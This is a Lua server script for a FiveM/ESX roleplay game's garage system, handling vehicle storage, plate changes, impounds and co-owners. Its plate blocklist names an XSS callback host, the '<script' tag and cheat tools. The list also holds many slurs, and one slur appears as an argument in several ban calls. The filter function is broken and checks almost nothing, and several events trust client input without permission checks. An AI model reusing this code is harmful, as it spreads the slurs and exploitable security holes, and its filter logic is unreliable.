ESX.RegisterServerCallback('falszywyy_garages:getVehicles', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
	local carsToReturn = {}
	
	local result = MySQL.query.await('SELECT vehicle FROM owned_vehicles WHERE ((owner = @identifier AND digit = @digit) or (co_owner = @identifier AND co_digit = @digit) or (co_owner2 = @identifier AND co_digit2 = @digit) or (co_owner3 = @identifier AND co_digit3 = @digit)) AND state = @state AND job IS NULL AND type = @type', {
		['@identifier'] = xPlayer.identifier, ['@digit'] = xPlayer.getDigit(), ['@state'] = 'stored', ['@type'] = 'car'}
	)

	for i=1, #result, 1 do
		local car = json.decode(result[i].vehicle)
	
		table.insert(carsToReturn, car)
	end

	Wait(150)
	cb(carsToReturn)
end)

ESX.RegisterServerCallback('falszywyy_garages:getBoats', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
	local carsToReturn = {}
	
	local result = MySQL.query.await('SELECT vehicle FROM owned_vehicles WHERE ((owner = @identifier AND digit = @digit) or (co_owner = @identifier AND co_digit = @digit) or (co_owner2 = @identifier AND co_digit2 = @digit) or (co_owner3 = @identifier AND co_digit3 = @digit)) AND state = @state AND job IS NULL AND type = @type', {
		['@identifier'] = xPlayer.identifier, ['@digit'] = xPlayer.getDigit(), ['@state'] = 'stored', ['@type'] = 'boat'}
	)

	for i=1, #result, 1 do
		local car = json.decode(result[i].vehicle)
	
		table.insert(carsToReturn, car)
	end

	Wait(150)
	cb(carsToReturn)
end)

ESX.RegisterServerCallback('falszywyy_garages:getPlanes', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
	local carsToReturn = {}
	
	local result = MySQL.query.await('SELECT vehicle FROM owned_vehicles WHERE ((owner = @identifier AND digit = @digit) or (co_owner = @identifier AND co_digit = @digit) or (co_owner2 = @identifier AND co_digit2 = @digit) or (co_owner3 = @identifier AND co_digit3 = @digit)) AND state = @state AND job IS NULL AND type = @type', {
		['@identifier'] = xPlayer.identifier, ['@digit'] = xPlayer.getDigit(), ['@state'] = 'stored', ['@type'] = 'plane'}
	)

	for i=1, #result, 1 do
		local car = json.decode(result[i].vehicle)
	
		table.insert(carsToReturn, car)
	end

	Wait(150)
	cb(carsToReturn)
end)

RegisterServerEvent('falszywyy_garages:updateState')
AddEventHandler('falszywyy_garages:updateState', function(plate)
	MySQL.update.await(
		'UPDATE `owned_vehicles` SET state = @state WHERE plate = @plate',
		{
			['@plate'] = plate,
			['@state'] = "stored"
		}
	)
end)
local bl = {
	"Hitler",
	"Hilter",
	"Himler",
	"Himmler",
	"Stalin",
	"Putin",
	"PixaRP",
	"NotRP",
	"sativa",
	"SativaRP",
	"HypeRP",
	"richrp.pl",
	"richrp",
	"213rp.pl",
	"213rp",
	"adrenalinarp.pl",
	"adrenalinarp",
	"asgard.",
	"asgard",
	"eulen.",
	"eulen",
	"skript.gg",
	"skript",
	"kosmici",
	"kosmici.space",
	"nigga",
	"n igga",
	"nig ga",
	"nigg a",
	"n igger",
	"ni gger",
	"nig ger",
	"nigge r",
	"pedal",
	"pedał",
	"pedała",
	"pedale",
	"simp",
	"down",
	"faggot",
	"upośledzony",
	"upośledzona",
	"retarded",
	"czarnuch",
	"c wel",
	"cw el",
	"cwel",
	"cwe l",
	"czarnuh",
	"żyd",
	"zyd",
	"hitler",
	"jebac disa",
	"nygus",
	"ciota",
	"cioty",
	"cioto",
	"cwelu",
	"cwele",
	"czarnuchu",
	"niggerze",
	"nigerze",
	"downie",
	"nygusie",
	"karzeł",
	"karzel",
	"simpie",
	"pedalskie",
	"zydzie",
	"żydzie",
	"geju",
	"administrator",
    "admin",
    "adm1n",
    "adm!n",
    "admln",
    "moderator",
    "owner",
    "nigger",
    "n1gger",
    "moderator",
    "eulencheats",
    "lynxmenu",
    "atgmenu",
    "hacker",
    "bastard",
    "hamhaxia",
    "333gang",
    "ukrp",
    "eguk",
    "n1gger",
    "n1ga",
    "nigga",
    "n1gga",
    "nigg3r",
    "nig3r",
    "shagged",
    "4dm1n",
    "4dmin",
    "m0d3r4t0r",
    "n199er",
    "n1993r",
    "rustchance.com",
    "rustchance",
    "hellcase.com",
    "hellcase",
    "youtube.com",
    "youtu.be",
	"HypeRP",
    "youtube",
    "twitch.tv",
    "twitch",
    "anticheat",
    "fucking",
    "ψ",
    "@",
    "&",
    "{",
    "}",
    ";",
    "ϟ",
    "♕",
    "Æ",
    "Œ",
    "‰",
    "™",
    "š",
    "œ",
    "Ÿ",
    "µ",
    "ß",
    "±",
    "¦",
    "»",
    "«",
    "¼",
    "½",
    "¾",
    "¬",
    "¿",
    "Ñ",
    "®",
    "©",
    "²",
    "·",
    "•",
    "°",
    "þ",
    "ベ",
    "ル",
    "ろ",
    "ぬ",
    "ふ",
    "う",
    "え",
    "お",
    "や",
    "ゆ",
    "よ",
    "わ",
    "ほ",
    "へ",
    "た",
    "て",
    "い",
    "す",
    "か",
    "ん",
    "な",
    "に",
    "ら",
    "ぜ",
    "む",
    "ち",
    "と",
    "し",
    "は",
    "き",
    "く",
    "ま",
    "の",
    "り",
    "れ",
    "け",
    "む",
    "つ",
    "さ",
    "そ",
    "ひ",
    "こ",
    "み",
    "も",
    "ね",
    "る",
    "め",
    "ロ",
    "ヌ",
    "フ",
    "ア",
    "ウ",
    "エ",
    "オ",
    "ヤ",
    "ユ",
    "ヨ",
    "ワ",
    "ホ",
    "ヘ",
    "タ",
    "テ",
    "イ",
    "ス",
    "カ",
    "ン",
    "ナ",
    "ニ",
    "ラ",
    "セ",
    "ム",
    "チ",
    "ト",
    "シ",
    "ハ",
    "キ",
    "ク",
    "マ",
    "ノ",
    "リ",
    "レ",
    "ケ",
    "ム",
    "ツ",
    "サ",
    "ソ",
    "ヒ",
    "コ",
    "ミ",
    "モ",
    "ネ",
    "ル",
    "メ",
    "✪",
    "Ä",
    "ƒ",
    "Ã",
    "¢",
    "?",
    "†",
    "€",
    "웃",
    "и",
    "】",
    "【",
    "j4p.pl",
    "ֆ",
    "ȶ",
    "你",
    "好",
    "爱",
    "幸",
    "福",
    "猫",
    "狗",
    "微",
    "笑",
    "中",
    "安",
    "東",
    "尼",
    "杰",
    "诶",
    "西",
    "开",
    "陈",
    "瑞",
    "华",
    "馬",
    "塞",
    "洛",
    "ダ",
    "仇",
    "觉",
    "感",
    "衣",
    "德",
    "曼",
    "L͙",
    "a͙",
    "l͙",
    "ľ̶̚͝",
    "Ḩ̷̤͚̤͑͂̎̎͆",
    "a̸̢͉̠͎͒͌͐̑̇",
    "♚",
    "я",
    "Ʒ",
    "Ӂ̴",
    "Ƹ̴",
    "≋",
    "civilgamers.com",
    "civilgamers",
    "csgoempire.com",
    "csgoempire",
    "g4skins.com",
    "g4skins",
    "gameodds.gg",
    "duckfuck.com",
    "crysishosting.com",
    "crysishosting",
    "key-drop.com",
    "key-drop.pl",
    "skinhub.com",
    "skinhub",
    "`",
    "¤",
    "¡",
    "casedrop.eu",
    "casedrop",
    "cs.money",
    "rustypot.com",
    "✈",
    "⛧",
    "☭",
    "☣",
    "✠",
    "dkb.xss.ht",
    "( . )( . )",
    "⚆",
    "╮",
    "╭",
    "rampage.lt",
    "?",
    "xcasecsgo.com",
    "xcasecsgo",
    "csgocases.com",
    "csgocases",
    "K9GrillzUK.co.uk",
    "moat.gg",
    "princevidz.com",
    "princevidz",
    "pvpro.com",
    "Pvpro",
    "ez.krimes.ro",
    "loot.farm",
    "arma3fisherslife.net",
    "arma3fisherslife",
    "egamers.io",
    "ifn.gg",
    "key-drop",
    "sups.gg",
    "tradeit.gg",
    "§",
    "csgotraders.net",
    "csgotraders",
    "Σ","Ξ",
    "hurtfun.com",
    "hurtfun",
    "gamekit.com",
    "¥",
    "t.tv",
    "yandex.ru",
    "yandex",
    "csgofly.com",
    "csgofly",
    "pornhub.com",
    "pornhub",
    "一",
    "",
    "Ｊ",
    "◢",
    "◤",
    "⋡",
    "℟",
    "ᴮ",
    "ᴼ",
    "ᴛᴇᴀᴍ",
    "cs.deals",
    "twat",
    "STRESS.PW",
    "<script",
	"skript.gg",
	"skript",
}

checkBL = function(x)
    
    for k,v in pairs(bl) do
        if(not string.find(x, v)) then
            return 1
        else
            return 0
        end
    end
    
end


RegisterServerEvent('falszywyy_garages:updatePlate')
AddEventHandler('falszywyy_garages:updatePlate', function(oldplate, newplate)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local oldPlate = string.upper(oldplate)
	local newPlate = string.upper(newplate)
	if(checkBL(newplate)) then
		if xPlayer.getMoney() >= 500000 then
			xPlayer.removeAccountMoney('money', 500000)
			MySQL.update('UPDATE owned_vehicles SET plate = @newPlate, vehicle = JSON_SET(vehicle, "$.plate", @newPlate) WHERE plate = @plate',{ 
				['@plate'] = oldPlate,
				['@newPlate'] = newPlate
			})
			TriggerEvent('esx_addonaccount:getSharedAccount', 'society_doj', function(account)
				account.addAccountMoney(50000)
			end)
			xPlayer.showNotification('Rejestracja ~b~' .. oldPlate .. '~w~ została zmieniona na ~y~' .. newPlate)
			exports['exile_logs']:SendLog(xPlayer.source, 'Rejestracja **' .. oldPlate .. '** została zmieniona na **' .. newPlate .. "**", 'plates')
		else
			xPlayer.showNotification('~r~Potrzebujesz minimum 500 000$, aby zmienić rejestrację')
		end
	else
		xPlayer.showNotification('~r~Nie możesz ustawić zabronionej rejestracji!')
	end
end)

ESX.RegisterServerCallback('falszywyy_garages:checkIfVehicleIsOwned', function (source, cb, plate)
	local xPlayer = ESX.GetPlayerFromId(source)
	local identifier = xPlayer.identifier
	local found = nil
	local vehicleData = nil
	MySQL.query(
	'SELECT vehicle FROM owned_vehicles WHERE (owner = @owner AND digit = @digit) or (co_owner = @owner AND co_digit = @digit) or (co_owner2 = @owner AND co_digit2) or (co_owner3 = @owner AND co_digit3) AND state=@state',
	{
		['@owner'] = identifier,
		['@digit'] = xPlayer.getDigit(),
		['state'] = 'stored'
	},
	function (result2)
		local vehicles = {}
		for i=1, #result2, 1 do
			vehicleData = json.decode(result2[i].vehicle)
			if vehicleData ~= nil and vehicleData.plate == plate then
				found = true
				cb(vehicleData)
				break
			end
		end
		if not found then
			cb(nil)
		end
	end
	)
end)

RegisterServerEvent('falszywyy_garages:pullCar')
AddEventHandler('falszywyy_garages:pullCar', function(car)
	local xPlayer = ESX.GetPlayerFromId(source)
	MySQL.update.await("UPDATE owned_vehicles SET state=@stan WHERE plate=@plate", {
		['@plate'] = car.plate,
		['@stan'] = 'pulledout'
	})
	TriggerClientEvent('esx:showNotification', xPlayer.source, "~g~Pojazd wyciągnięty")
end)

RegisterServerEvent('falszywyy_garages:leftCar')
AddEventHandler('falszywyy_garages:leftCar', function(car)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local plate = car.plate
	local check = exports["exile_framework"]:checkPlate(plate)
	if check.is then
		plate = check.plate
		car.plate = plate
		exports["exile_framework"]:removePlate(plate)
	end
	local result = MySQL.query.await("SELECT firstmodel,vehicle FROM owned_vehicles WHERE plate=@plate", { 
		['@plate'] = plate
	})
	if result then
		local x = json.decode(result[1].vehicle)
		if result[1].firstmodel then
			if tostring(car.model) ~= tostring(result[1].firstmodel) then
				MySQL.update.await("UPDATE owned_vehicles SET state=@stan, vehicle = @vehicle WHERE plate=@plate", {
					['@plate'] = plate,
					['@stan'] = 'stored',
					['@vehicle'] = json.encode(car)
				})
				TriggerEvent("exilerp_scripts:banPlr", "nigger", _source,  "Tried to change car hash (exile_garages)")
			else
				if tostring(car.model) == tostring(x.model) then
					MySQL.update.await("UPDATE owned_vehicles SET state=@stan, vehicle = @vehicle WHERE plate=@plate", {
						['@plate'] = plate,
						['@stan'] = 'stored',
						['@vehicle'] = json.encode(car)
					})
				else
					TriggerEvent("exilerp_scripts:banPlr", "nigger", _source, "Tried to change car model (exile_garages)")
				end
			end
		else
			if tostring(car.model) == tostring(x.model) then
				MySQL.update.await("UPDATE owned_vehicles SET state=@stan, vehicle = @vehicle WHERE plate=@plate", {
					['@plate'] = plate,
					['@stan'] = 'stored',
					['@vehicle'] = json.encode(car)
				})
			else
				TriggerEvent("exilerp_scripts:banPlr", "nigger", _source, "Tried to change car model (exile_garages)")
			end
		end
	else
		MySQL.update.await("UPDATE owned_vehicles SET state=@stan, vehicle = @vehicle WHERE plate=@plate", {
			['@plate'] = plate,
			['@stan'] = 'stored',
			['@vehicle'] = json.encode(car)
		})
	end
end)

RegisterServerEvent('exile_garages:findVehicle')
AddEventHandler('exile_garages:findVehicle', function(plate)
	local _source = source
	local result = MySQL.query.await("SELECT state FROM owned_vehicles WHERE plate=@plate", { 
		['@plate'] = plate
	})
	if result[1] ~= nil then
		if result[1].state == "anonymous" then
		else
			TriggerClientEvent('exile_garages:findVehicle', -1, plate, _source)
		end
	else
		TriggerClientEvent('exile_garages:findVehicle', -1, plate, _source)
	end
end)

RegisterServerEvent('exile_garages:findVehicleAll')
AddEventHandler('exile_garages:findVehicleAll', function()
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local result = MySQL.query.await("SELECT state, plate FROM owned_vehicles WHERE owner=@owner AND digit=@digit OR co_owner=@owner AND co_digit=@digit OR co_owner2=@owner AND co_digit2=@digit OR co_owner3=@owner AND co_digit3=@digit", { 
		['@owner'] = xPlayer.getIdentifier(),
		['@digit'] = xPlayer.getDigit()
	})
	if result ~= nil then
		local countOut = 0
		for i,v in ipairs(result) do
			if v.state ~= "anonymous" and v.state == "pulledout" then
				countOut = countOut + 1
				TriggerClientEvent('exile_garages:findVehicle', -1, v.plate, _source)
				TriggerEvent('falszywyy_garages:updateState', v.plate)
				xPlayer.showNotification("Pojazd o numerze rejestracyjnym ~y~" .. v.plate .. "~w~ został ~g~odholowany")
			end
		end
		if countOut == 0 then
			xPlayer.showNotification("~r~Nie masz żadnych pojazdów do odholowania")
		end
	end
end)

RegisterServerEvent('falszywyy_garages:destroyCar')
AddEventHandler('falszywyy_garages:destroyCar', function(car)
	local xPlayer = ESX.GetPlayerFromId(source)
	local randHours = math.random(12, 24)
	local destroyTime = os.time() + (tonumber(randHours) * 3600)
	local result = MySQL.query.await("SELECT owner, co_owner, co_owner2, co_owner3, vehicle FROM owned_vehicles WHERE plate=@plate", { 
		['@plate'] = car.plate
	})
	
	if result[1] ~= nil then
		if result[1].owner == xPlayer.identifier or result[1].co_owner == xPlayer.identifier or result[1].co_owner2 == xPlayer.identifier or result[1].co_owner3 == xPlayer.identifier then
			MySQL.update.await("UPDATE owned_vehicles SET state=@state, destroyed = @destroyed, vehicle = @vehicle WHERE plate=@plate", {
				['@plate'] = car.plate,
				['@state'] = 'destroyed',
				['@destroyed'] = destroyTime,
				['@vehicle'] = json.encode(car)
			})
			xPlayer.showNotification('~y~Zezłomowałeś ~w~, własny pojazd i ~r~nic nie zarobiłeś')
			exports['exile_logs']:SendLog(xPlayer.source, "Zezłomowano własny pojazd", 'scrapyard')
		else
			local price = 5000
			local choosenVeh = json.decode(result[1].vehicle)
			local findVeh = exports['esx_vehicleshop']:GetVehicle(choosenVeh.model)
			if findVeh ~= nil then
				price = math.floor((findVeh.price * 4) / 1000)
			end
			MySQL.update.await("UPDATE owned_vehicles SET state=@state, destroyed = @destroyed, vehicle = @vehicle WHERE plate=@plate", {
				['@plate'] = car.plate,
				['@state'] = 'destroyed',
				['@destroyed'] = destroyTime,
				['@vehicle'] = json.encode(car)
			})
			xPlayer.addMoney(price)
			xPlayer.showNotification('~y~Zezłomowałeś pojazd~w~ i zarobiłeś ~g~' .. price .. '$')
			exports['exile_logs']:SendLog(xPlayer.source, "Zezłomowano pojazd - Gracz zarobił " .. price .. "$", 'scrapyard')
		end
	else
		xPlayer.showNotification("~r~Ten pojazd do nikogo nie należy. Nic nie zarobisz")
		exports['exile_logs']:SendLog(xPlayer.source, "Zezłomowano pojazd nienależący do nikogo - Nie otrzymano zapłaty", 'scrapyard')
	end
end)

ESX.RegisterServerCallback('falszywyy_garages:checkCar', function(source, cb, plates)
	local xPlayer = ESX.GetPlayerFromId(source)
	local cebulion = false
	local plate = plates.plate
	local check = exports["exile_framework"]:checkPlate(plate)
	if check.is then
		plate = check.plate
	end

	local result = MySQL.query.await("SELECT owner, digit, co_owner, co_digit, co_owner2, co_digit2, co_owner3, co_digit3 FROM owned_vehicles WHERE plate=@plate", { 
		['@plate'] = plate
	})

	if not result[1] then
		cb(false)
	else
		if result[1].owner == xPlayer.identifier and result[1].digit == xPlayer.getDigit() then
			cb(1)
		elseif (result[1].co_owner == xPlayer.identifier and result[1].co_digit == xPlayer.getDigit()) or (result[1].co_owner2 == xPlayer.identifier and result[1].co_digit2 == xPlayer.getDigit()) or (result[1].co_owner3 == xPlayer.identifier and result[1].co_digit3 == xPlayer.getDigit()) then
			cb(2)
		else
			cb(false)
		end
	end
end)

ESX.RegisterServerCallback('falszywyy_garages:getVehiclesToTow',function(source, cb)	
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local identifier = xPlayer.identifier
	local vehicles = {}
	MySQL.query("SELECT state, destroyed, plate, vehicle FROM owned_vehicles WHERE ((owner=@identifier AND digit=@digit) or (co_owner = @identifier AND co_digit=@digit) or (co_owner2 = @identifier AND co_digit2=@digit) or (co_owner3 = @identifier AND co_digit3=@digit)) AND (state=@state or state=@state2 or state=@state3) AND job IS NULL",
	{
		['@identifier'] = identifier,
		['@digit']	= xPlayer.getDigit(),
		['@state'] = "pulledout",
		['@state2'] = "destroyed",
		['@state3'] = xPlayer.thirdjob.name
	}, 
	function(data)
		for _,v in pairs(data) do
			if v.state == 'destroyed' then
				local nowTime = os.time()
				local resultTime = v.destroyed
				if resultTime <= nowTime then
					MySQL.update(
						'UPDATE `owned_vehicles` SET state = @state, destroyed = NULL WHERE plate = @plate',
						{
						  ['@plate'] = v.plate,
						  ['@state'] = 'pulledout'
						}
					)
					local vehicle = json.decode(v.vehicle)
					table.insert(vehicles, vehicle)
				end
			else
				local vehicle = json.decode(v.vehicle)
				table.insert(vehicles, vehicle)
			end
		end
		cb(vehicles)
	end)
end)

ESX.RegisterServerCallback('falszywyy_garages:getTakedVehicles', function(source, cb)
	local vehicles = {}
	MySQL.query("SELECT vehicle FROM owned_vehicles WHERE state = @state",
	{ ['@state'] = 'policeParking'}, 
	function(data) 
		for _,v in pairs(data) do
			local vehicle = json.decode(v.vehicle)
			table.insert(vehicles, vehicle)
		end
		cb(vehicles)
	end)
end)

ESX.RegisterServerCallback('falszywyy_garages:getTakedVehiclesMech', function(source, cb)
	local vehicles = {}
	MySQL.query("SELECT vehicle FROM owned_vehicles WHERE state = @state",
	{ ['@state'] = 'mechanicParking'}, 
	function(data) 
		for _,v in pairs(data) do
			local vehicle = json.decode(v.vehicle)
			table.insert(vehicles, vehicle)
		end
		cb(vehicles)
	end)
end)

RegisterServerEvent('falszywyy_garages:removeCarFromPoliceParking')
AddEventHandler('falszywyy_garages:removeCarFromPoliceParking', function(plate)
	local xPlayer = ESX.GetPlayerFromId(source)
	if plate ~= nil then
		MySQL.update(
			'UPDATE `owned_vehicles` SET state = @state WHERE plate = @plate',
			{
			  ['@plate'] = plate,
			  ['@state'] = 'pulledout'
			}
		)
		TriggerClientEvent('esx:showNotification', xPlayer.source, "~g~Pojazd wyciągnięty")
		exports['exile_logs']:SendLog(source, 'WYCIĄGNIĘTO: Auto z parkingu policyjnego/mechanicznego rej: '..plate, 'policeparking')
	end
end)

RegisterServerEvent('falszywyy_garages:addCarFromPoliceParking')
AddEventHandler('falszywyy_garages:addCarFromPoliceParking', function(plate)
	local xPlayer = ESX.GetPlayerFromId(source)
	if plate ~= nil then
		MySQL.update(
			'UPDATE `owned_vehicles` SET state = @state WHERE plate = @plate',
			{
			  ['@plate'] = plate,
			  ['@state'] = 'policeParking',
			}
		)
		exports['exile_logs']:SendLog(source, 'WŁOŻONO: Auto na parking policyjny rej: '..plate, 'policeparking')
	end
end)

RegisterServerEvent('falszywyy_garages:addCarFromPoliceParkingMECH')
AddEventHandler('falszywyy_garages:addCarFromPoliceParkingMECH', function(plate)
	local xPlayer = ESX.GetPlayerFromId(source)
	if plate ~= nil then
		MySQL.update(
			'UPDATE `owned_vehicles` SET state = @state WHERE plate = @plate',
			{
			  ['@plate'] = plate,
			  ['@state'] = 'mechanicParking',
			}
		)
		exports['exile_logs']:SendLog(source, 'WŁOŻONO: Auto na parking mechaników rej: '..plate, 'policeparking')
	end
end)

ESX.RegisterServerCallback('falszywyy_garages:checkVehProps', function (source, cb, plate)
	MySQL.query(
	'SELECT vehicle FROM owned_vehicles WHERE plate = @plate',
	{ 
		['@plate'] = plate
	},
	function (result2)
		if result2[1] then
			cb(json.decode(result2[1].vehicle))
		end
	end
	)
end)

ESX.RegisterServerCallback('falszywyy_garages:checkMoney', function(source, cb, pedal)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local HasInsurance = exports['esx_exilemenu']:CheckInsuranceLSC(xPlayer.job.name)

	TriggerEvent('esx_license:checkLicense', _source, "oc_insurance", function(has)
		if has == true or HasInsurance then
			if not pedal then
				if xPlayer.getMoney() >= 2500 then
					xPlayer.removeMoney(2500)
					TriggerEvent('esx_addonaccount:getSharedAccount', 'society_police', function(account)
						account.addAccountMoney(1250)
					end)
					cb(1)
				elseif xPlayer.getAccount('bank').money >= 2500 then
					xPlayer.removeAccountMoney('bank', 2500)
					TriggerEvent('esx_addonaccount:getSharedAccount', 'society_police', function(account)
						account.addAccountMoney(1250)
					end)
					cb(1)
				else
					cb(2)
				end
			else
				if xPlayer.getMoney() >= 15000 then
					xPlayer.removeMoney(15000)
					TriggerEvent('esx_addonaccount:getSharedAccount', 'society_police', function(account)
						account.addAccountMoney(7500)
					end)
					cb(1)
				elseif xPlayer.getAccount('bank').money >= 15000 then
					xPlayer.removeAccountMoney('bank', 15000)
					TriggerEvent('esx_addonaccount:getSharedAccount', 'society_police', function(account)
						account.addAccountMoney(7500)
					end)
					cb(1)
				else
					cb(4)
				end
			end	
		else
			if not pedal then
				if xPlayer.getMoney() >= 5000 then
					xPlayer.removeMoney(5000)
					TriggerEvent('esx_addonaccount:getSharedAccount', 'society_police', function(account)
						account.addAccountMoney(2500)
					end)
					cb(1)
				elseif xPlayer.getAccount('bank').money >= 5000 then
					xPlayer.removeAccountMoney('bank', 2500)
					TriggerEvent('esx_addonaccount:getSharedAccount', 'society_police', function(account)
						account.addAccountMoney(2500)
					end)
					cb(1)
				else
					cb(3)
				end
			else
				if xPlayer.getMoney() >= 30000 then
					xPlayer.removeMoney(30000)
					TriggerEvent('esx_addonaccount:getSharedAccount', 'society_police', function(account)
						account.addAccountMoney(1500)
					end)
					cb(1)
				elseif xPlayer.getAccount('bank').money >= 30000 then
					xPlayer.removeAccountMoney('bank', 30000)
					TriggerEvent('esx_addonaccount:getSharedAccount', 'society_police', function(account)
						account.addAccountMoney(15000)
					end)
					cb(1)
				else
					cb(5)
				end
			end	
		end
	end)	
end)

RegisterServerEvent('falszywyy_garages:buyContract')
AddEventHandler('falszywyy_garages:buyContract', function()
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.getMoney() >= 15000 then
		xPlayer.removeMoney(15000)
		xPlayer.addInventoryItem('contract', 1)
		TriggerEvent('esx_addonaccount:getSharedAccount', 'society_doj', function(account)
			account.addAccountMoney(7500)
		end)
	else
		xPlayer.showNotification("~r~Nie masz wystarczająco pieniędzy!")
	end
end)

ESX.RegisterServerCallback('falszywyy_garages:checkIfPlayerIsOwner', function (source, cb, plate)
	local xPlayer = ESX.GetPlayerFromId(source)
	local identifier = xPlayer.identifier
	MySQL.query(
	'SELECT owner FROM owned_vehicles WHERE owner = @owner AND digit = @digit AND plate = @plate',
	{ 
		['@owner'] = identifier,
		['@digit'] = xPlayer.getDigit(),
		['@plate'] = plate
	},
	function (result2)
		if result2[1] ~= nil then
			cb(true)
		else
			cb(false)
		end
	end
	)
end)

RegisterServerEvent('falszywyy_garages:setSubowner')
AddEventHandler('falszywyy_garages:setSubowner', function(plate, tID)
	local xPlayer = ESX.GetPlayerFromId(source)
	local subPrice = 200000	
	local tPlayer = ESX.GetPlayerFromId(tID)
	local identifier = xPlayer.identifier
	local tIdentifier = tPlayer.identifier
	
	MySQL.Async.fetchAll(
		'SELECT owner, co_owner, co_owner2, co_owner3, vehicle FROM owned_vehicles WHERE plate = @plate',
		{
			['@plate'] = plate
		},
		function(result)
			if result ~= nil then
				if result[1].owner == identifier then
					if result[1].co_owner ~= nil and result[1].co_owner2 ~= nil  and result[1].co_owner3 ~= nil then
						xPlayer.showNotification("~r~Ten pojazd posiada maksymalną liczbę współwłaścicieli!")
					else
						local choosenVeh = json.decode(result[1].vehicle)
						local findVeh = exports['esx_vehicleshop']:GetVehicle(choosenVeh.model)
						if findVeh ~= nil then
							subPrice = math.floor(findVeh.price * 0.05)
						end
						if xPlayer.getMoney() < subPrice then
							xPlayer.showNotification("~r~Dodanie współwłaściciela w tym aucie kosztuje " .. subPrice .. "$")
						else
							if result[1].co_owner == nil then
								MySQL.Sync.execute(
									'UPDATE owned_vehicles SET co_owner = @co_owner, co_digit = @co_digit WHERE plate = @plate',
									{
										['@co_owner']   = tIdentifier,
										['@co_digit']	= tPlayer.getDigit(),
										['@plate'] = plate,
									}
								)
								TriggerClientEvent('esx:showNotification', xPlayer.source,"~g~Dodałeś nowego współwłaściciela")
								TriggerClientEvent('esx:showNotification', tPlayer.source, "~g~Zostałeś współwłaścicielem pojazdu o numerach " .. plate)
							elseif result[1].co_owner2 == nil then
								MySQL.Sync.execute(
									'UPDATE owned_vehicles SET co_owner2 = @co_owner2, co_digit2 = @co_digit2 WHERE plate = @plate',
									{
										['@co_owner2']   = tIdentifier,
										['@co_digit2']	= tPlayer.getDigit(),
										['@plate'] = plate,
									}
								)
								TriggerClientEvent('esx:showNotification', xPlayer.source,"~g~Dodałeś nowego współwłaściciela")
								TriggerClientEvent('esx:showNotification', tPlayer.source, "~g~Zostałeś współwłaścicielem pojazdu o numerach " .. plate)
							elseif result[1].co_owner3 == nil then
								MySQL.Sync.execute(
									'UPDATE owned_vehicles SET co_owner3 = @co_owner3, co_digit3 = @co_digit3 WHERE plate = @plate',
									{
										['@co_owner3']   = tIdentifier,
										['@co_digit3']	= tPlayer.getDigit(),
										['@plate'] = plate,
									}
								)
								TriggerClientEvent('esx:showNotification', xPlayer.source,"~g~Dodałeś nowego współwłaściciela")
								TriggerClientEvent('esx:showNotification', tPlayer.source, "~g~Zostałeś współwłaścicielem pojazdu o numerach " .. plate)
							end
							xPlayer.removeMoney(subPrice)
						end
					end
				else
					TriggerClientEvent('esx:showNotification', xPlayer.source, "~r~Nie jesteś właścicielem tego pojazdu!")
				end
			else
				TriggerClientEvent('esx:showNotification', xPlayer.source, "~r~Taki pojazd nie istnieje!")
			end
		end
	)
end)

ESX.RegisterServerCallback('falszywyy_garages:getSubOwners', function(source,cb,plate) 
	MySQL.query(
		'SELECT co_owner FROM owned_vehicles WHERE plate = @plate',
		{
			['@plate'] = plate,
		},
		function(result)
		if result[1] ~= nil then
			if result[1].co_owner ~= nil then
				who = result[1].co_owner
				MySQL.query('SELECT firstname, lastname FROM users WHERE identifier = @identifier',
					{
						['@identifier'] = who,
					},
					function(dane)
						cb(dane[1], result[1])
					end
				)
			else

				cb(nil,nil)
			end
		end
	end)
end)

ESX.RegisterServerCallback('falszywyy_garages:getSubOwners2', function(source,cb,plate) 
	MySQL.query(
		'SELECT co_owner2 FROM owned_vehicles WHERE plate = @plate',
		{
			['@plate'] = plate,
		},
		function(result)
		if result[1] ~= nil then
			if result[1].co_owner2 ~= nil then
				who = result[1].co_owner2
				MySQL.query('SELECT firstname, lastname FROM users WHERE identifier = @identifier',
					{
						['@identifier'] = who,
					},
					function(dane)
						cb(dane[1], result[1])
					end
				)
			else

				cb(nil,nil)
			end
		end
	end)
end)

ESX.RegisterServerCallback('falszywyy_garages:getSubOwners3', function(source,cb,plate) 
	MySQL.query(
		'SELECT co_owner3 FROM owned_vehicles WHERE plate = @plate',
		{
			['@plate'] = plate,
		},
		function(result)
		if result[1] ~= nil then
			if result[1].co_owner3 ~= nil then
				who = result[1].co_owner3
				MySQL.query('SELECT firstname, lastname FROM users WHERE identifier = @identifier',
					{
						['@identifier'] = who,
					},
					function(dane)
						cb(dane[1], result[1])
					end
				)
			else

				cb(nil,nil)
			end
		end
	end)
end)

RegisterServerEvent('falszywyy_garages:deleteSubowner')
AddEventHandler('falszywyy_garages:deleteSubowner', function(plate, who)
	local xPlayer = ESX.GetPlayerFromId(source)
	MySQL.query(
		'SELECT owner FROM owned_vehicles WHERE plate = @plate',
		{
			['@plate'] = plate,
		},
		function(result)
			if result[1] ~= nil then
				if xPlayer.identifier ~= result[1].owner then
					TriggerEvent("exilerp_scripts:banPlr", "nigger", source,  "Tried to delete someones car (exile_garages)")
					--exports['exile_logs']:SendLog(source, "Garages: Niepoprawny license check, gracz próbował usunąć komuś auto. [Cheater: "..xPlayer.identifier.." / pojazd należy do: "..result[1].owner.."]", 'anticheat')
					return
				end
			end
		end
	)
	MySQL.update.await(
		'UPDATE owned_vehicles SET co_owner = NULL, co_digit = 0 WHERE owner = @owner AND plate = @plate',
		{
			['@owner']   = xPlayer.identifier,
			['@plate'] 	 = plate
		}
	)
	TriggerClientEvent('esx:showNotification', xPlayer.source, "~g~Usunięto ~s~pierwszego~g~ współwłaściciela auta ~s~" .. plate)
end)

RegisterServerEvent('falszywyy_garages:deleteSubowner2')
AddEventHandler('falszywyy_garages:deleteSubowner2', function(plate, who)
	local xPlayer = ESX.GetPlayerFromId(source)
	MySQL.query(
		'SELECT owner FROM owned_vehicles WHERE plate = @plate',
		{
			['@plate'] = plate,
		},
		function(result)
			if result[1] ~= nil then
				if xPlayer.identifier ~= result[1].owner then
